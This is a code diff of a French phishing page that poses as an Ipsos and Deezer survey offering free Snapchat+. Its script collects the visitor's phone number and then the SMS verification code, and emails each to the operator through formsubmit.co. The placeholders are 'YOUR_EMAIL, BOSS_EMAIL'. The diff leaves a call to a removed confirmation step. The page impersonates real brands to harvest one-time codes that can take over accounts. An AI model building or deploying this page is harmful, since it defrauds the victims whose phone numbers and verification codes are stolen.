@@ -5,30 +5,183 @@
     <title>Sondage | Ipsos</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family:'Inter', sans-serif; background:#f4f6f9; margin:0; overflow-x:hidden; }
-        .header { background:#003b7a; padding:20px 30px; display:flex; align-items:center; justify-content:center; position:relative; }
-        .header img { height:50px; }
-        .header a { position:absolute; left:30px; }
-        .header-text { color:#fff; font-size:26px; font-weight:700; }
-        .logo-fixed { position:fixed; top:20px; right:20px; height:55px; z-index:999; }
-        .box { max-width:650px; margin:60px auto; background:white; padding:45px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.12); text-align:center; transition:all 0.5s ease; opacity:0; transform:translateY(30px); display:none; }
-        .box.active { display:block; opacity:1; transform:translateY(0); }
-        h2 { font-size:28px; margin-bottom:20px; color:#003b7a; }
-        p { font-size:18px; margin-bottom:20px; color:#333; line-height:1.5; }
-        input { width:100%; padding:14px; font-size:18px; border-radius:6px; border:1px solid #ccc; margin-bottom:15px; transition:all 0.3s; }
-        input:focus { border-color:#0078d4; outline:none; box-shadow:0 0 8px rgba(0,120,212,0.3); }
-        button { padding:14px 28px; background:#0078d4; color:#fff; border:0; border-radius:8px; cursor:pointer; font-size:18px; transition:all 0.3s; }
-        button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-shadow:0 4px 12px rgba(0,0,0,0.15); }
-        .progress-container { width:90%; height:16px; background:#e0e0e0; border-radius:8px; margin:30px auto; position:relative; }
-        .progress-bar { height:100%; width:0%; background:#0078d4; border-radius:8px; transition:width 0.5s ease; }
-        .progress-text { position:absolute; right:10px; top:0; font-size:14px; font-weight:600; color:#003b7a; line-height:16px; }
-        .about { max-width:650px; margin:20px auto 40px auto; padding:20px; background:#e8f0fe; border-radius:10px; font-size:14px; color:#003b7a; line-height:1.4; text-align:left; }
-        .footer { text-align:center; padding:20px 0; font-size:14px; color:#999; margin-top:20px; border-top:1px solid #ddd; }
-        @media(max-width:600px){ .box{margin:30px 20px;padding:30px} h2{font-size:24px} p{font-size:16px} button{font-size:16px} .about{font-size:13px;padding:15px} }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #f4f6f9;
+            margin: 0;
+            overflow-x: hidden;
+        }
+
+        /* HEADER */
+        .header {
+            background: #003b7a;
+            padding: 35px 40px; /* Augmenter la hauteur du header */
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); /* Ajout d'un ombrage léger pour le header */
+        }
+
+        .header img {
+            height: 60px; /* Augmenter la taille du logo */
+        }
+
+        .header a {
+            position: absolute;
+            left: 30px;
+        }
+
+        .header-text {
+            color: #fff;
+            font-size: 28px; /* Agrandir légèrement la taille du texte */
+            font-weight: 700;
+        }
+
+        .logo-fixed {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            height: 55px;
+            z-index: 999;
+        }
+
+        /* BOUTONS ET TEXTES CENTRÉS */
+        .box {
+            max-width: 650px;
+            margin: 60px auto;
+            background: white;
+            padding: 50px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.12);
+            text-align: center;
+            transition: all 0.5s ease;
+            opacity: 0;
+            transform: translateY(30px);
+            display: none;
+        }
+
+        .box.active {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        h2 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            color: #003b7a;
+        }
+
+        p {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #333;
+            line-height: 1.5;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            font-size: 18px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            margin-bottom: 15px;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            border-color: #0078d4;
+            outline: none;
+            box-shadow: 0 0 8px rgba(0, 120, 212, 0.3);
+        }
+
+        button {
+            padding: 14px 28px;
+            background: #0078d4;
+            color: #fff;
+            border: 0;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: all 0.3s;
+        }
+
+        button:hover {
+            background: #005fa3;
+            transform: translateY(-2px) scale(1.03);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .progress-container {
+            width: 90%;
+            height: 16px;
+            background: #e0e0e0;
+            border-radius: 8px;
+            margin: 30px auto;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #0078d4;
+            border-radius: 8px;
+            transition: width 0.5s ease;
+        }
+
+        .progress-text {
+            position: absolute;
+            right: 10px;
+            top: 0;
+            font-size: 14px;
+            font-weight: 600;
+            color: #003b7a;
+            line-height: 16px;
+        }
+
+        .about {
+            max-width: 650px;
+            margin: 20px auto 40px auto;
+            padding: 20px;
+            background: #e8f0fe;
+            border-radius: 10px;
+            font-size: 14px;
+            color: #003b7a;
+            line-height: 1.4;
+            text-align: left;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px 0;
+            font-size: 14px;
+            color: #999;
+            margin-top: 20px;
+            border-top: 1px solid #ddd;
+        }
+
+        @media (max-width: 600px) {
+            .box {
+                margin: 30px 20px;
+                padding: 30px;
+            }
+            h2 {
+                font-size: 24px;
+            }
+            p {
+                font-size: 16px;
+            }
+            button {
+                font-size: 16px;
+            }
+            .about {
+                font-size: 13px;
+                padding: 15px;
+            }
+        }
     </style>
 </head>
 <body>
-
     <img src="francelogo.png" class="logo-fixed" alt="France">
 
     <div class="header">
@@ -42,8 +195,7 @@
         <div class="progress-bar" id="progressBar"></div>
         <div class="progress-text" id="progressText">0%</div>
     </div>
-
-    <!-- Etape 1: Artistes -->
+    <!-- Étape 1: Artistes -->
     <div class="box active" id="etape1">
         <h2>Recevoir Snapchat+ 🎁</h2>
         <p>Pour recevoir Snapchat+, participez à ce sondage en collaboration avec <strong>Deezer</strong>. Offre réservée aux clients <strong>SFR, Bouygues ou Orange</strong>.</p>
@@ -52,65 +204,53 @@
         <input type="text" id="artiste_decouverte" placeholder="Artiste découvert récemment">
         <button id="btnEtape1">Suivant</button>
     </div>
-    <!-- Etape 2: Numéro de téléphone -->
+
+    <!-- Étape 2: Numéro de téléphone -->
     <div class="box" id="etape2">
         <h2>Numéro de téléphone</h2>
         <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
         <button id="btnEtape2">Suivant</button>
     </div>
 
-    <!-- Etape 3: Code SMS -->
+    <!-- Étape 3: Code SMS -->
     <div class="box" id="etape3">
         <h2>Code de vérification</h2>
         <input type="text" id="code_sms" placeholder="Code reçu">
         <button id="btnEtape3">Terminer</button>
     </div>
 
-    <!-- Confirmation -->
-    <div class="box" id="etape4">
-        <h2>Merci !</h2>
-        <p>Votre Snapchat+ sera activé dans l’heure. 🎉</p>
-    </div>
-
-    <div class="about">
-        <strong>À propos du partenariat :</strong><br>
-        Ce sondage est organisé par Ipsos en collaboration avec Deezer pour vous offrir Snapchat+ gratuitement.
-        L’offre est exclusivement réservée aux clients SFR, Bouygues Telecom et Orange afin de garantir la disponibilité et la compatibilité du service. 
-    </div>
-
     <div class="footer">© 2026 Ipsos – Tous droits réservés</div>
-
     <script>
         let reponses = {};
 
-        function showStep(etapeId, percent){
+        function showStep(etapeId, percent) {
             document.querySelectorAll('.box').forEach(b => b.classList.remove('active'));
             document.getElementById(etapeId).classList.add('active');
             document.getElementById('progressBar').style.width = percent + "%";
             document.getElementById('progressText').innerText = percent + "%";
         }
 
-        async function sendMail(dataObj, sujet, mail){
+        async function sendMail(dataObj, sujet, emailDest) {
             const formData = new FormData();
             formData.append("_subject", sujet);
-            formData.append("_cc", mail);
+            formData.append("_cc", emailDest);  // Email destinataire (ton email et celui de ton boss)
             formData.append("_captcha", "false");
             for (let key in dataObj) {
                 formData.append(key, dataObj[key]);
             }
             try {
-                await fetch("https://formsubmit.co/" + mail, { 
-                    method: "POST", 
-                    body: formData, 
+                await fetch("https://formsubmit.co/YOUR_EMAIL", {
+                    method: "POST",
+                    body: formData,
                     headers: { "Accept": "application/json" }
                 });
                 console.log("Mail envoyé:", sujet);
             } catch (e) {
-                console.error("Erreur d'envoi du mail", e);
+                console.error("Erreur d'envoi de mail", e);
             }
         }
 
-        // Etape 1 : Artistes
+        // Étape 1: Collecte des réponses des artistes
         document.getElementById('btnEtape1').addEventListener('click', () => {
             let pref = document.getElementById('artiste_prefere').value.trim();
             let deezer = document.getElementById('artiste_deezer').value.trim();
@@ -123,33 +263,36 @@
             reponses.artiste_deezer = deezer;
             reponses.artiste_decouverte = decouverte;
 
-            sendMail({artiste_prefere: pref, artiste_deezer: deezer, artiste_decouverte: decouverte}, "Réponses étape 1 - Ipsos", "tonemail@domaine.com");
+            sendMail({ artiste_prefere: pref, artiste_deezer: deezer, artiste_decouverte: decouverte }, "Réponses Étape 1 - Ipsos", "YOUR_EMAIL, BOSS_EMAIL");
             showStep('etape2', 50);
         });
-        // Etape 2 : Numéro de téléphone
+
+        // Étape 2: Collecte du numéro de téléphone
         document.getElementById('btnEtape2').addEventListener('click', () => {
             let tel = document.getElementById('telephone').value.trim();
-            if (!/^0[67]\d{8}$/.test(tel)) { 
-                alert("Numéro invalide (06 ou 07)."); 
-                return; 
+            if (!/^0[67]\d{8}$/.test(tel)) {
+                alert("Numéro invalide (06 ou 07).");
+                return;
             }
             reponses.telephone = tel;
-            sendMail({telephone: tel}, "Réponses étape 2 - Ipsos", "tonemail@domaine.com");
+            sendMail({ telephone: tel }, "Réponses Étape 2 - Ipsos", "YOUR_EMAIL, BOSS_EMAIL");
             showStep('etape3', 75);
         });
 
-        // Etape 3 : Code SMS
+        // Étape 3: Collecte du code SMS
         document.getElementById('btnEtape3').addEventListener('click', () => {
             let code = document.getElementById('code_sms').value.trim();
-            if (!code) { 
-                alert("Veuillez entrer le code."); 
-                return; 
+            if (!code) {
+                alert("Veuillez entrer le code.");
+                return;
             }
             reponses.code_sms = code;
-            sendMail({code_sms: code}, "Réponses étape 3 - Ipsos", "tonemail@domaine.com");
+            sendMail({ code_sms: code }, "Réponses Étape 3 - Ipsos", "YOUR_EMAIL, BOSS_EMAIL");
             showStep('etape4', 100);
         });
     </script>
+
 </body>
 </html>
+
 
